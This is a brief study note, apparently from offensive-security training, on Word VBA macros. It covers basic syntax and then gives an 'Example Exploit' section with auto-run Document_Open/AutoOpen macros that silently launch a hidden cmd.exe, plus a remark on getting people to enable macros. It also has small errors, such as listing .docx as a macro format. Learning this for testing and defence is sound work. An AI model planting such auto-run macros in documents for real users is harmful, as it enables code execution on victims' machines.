# Word Macros
By default new versions of word will block macros, however they are still enabled in versions < 2019.

## Declaring Variables
```
Dim Name As String
Dim Age As Long
Dim Pointer As LongPtr
```

## Conditionals

### If / Else statements
```
Sub MyMacro()

Dim Age As Long

Age = 12

If Age < 18 Then
    MsgBox("True")
Else
    MsgBox("False")
End If
```

### For Loops
```
Sub MyMacro()

For counter = 1 To 3
    MsgBox("Alert")
Next counter

End Sub
```

## Example Exploit
This macro must be saved as a `.doc` or `.docm`. `.docx`. The exlpoit will open up the command prompt as a hidden window. This process will be detected as a sub process of word.exe
```
Sub Document_Open()
    TestX
End Sub

Sub AutoOpen()
    TestX
End Sub

Sub TestX()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

This will open cmd as a hidden process:
```
Sub TestX2()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub

```

## Mark of the Web
This is a flag set inside a document to indicate it has been downloaded form the internet. It is the easier way to convice someone to open macros.

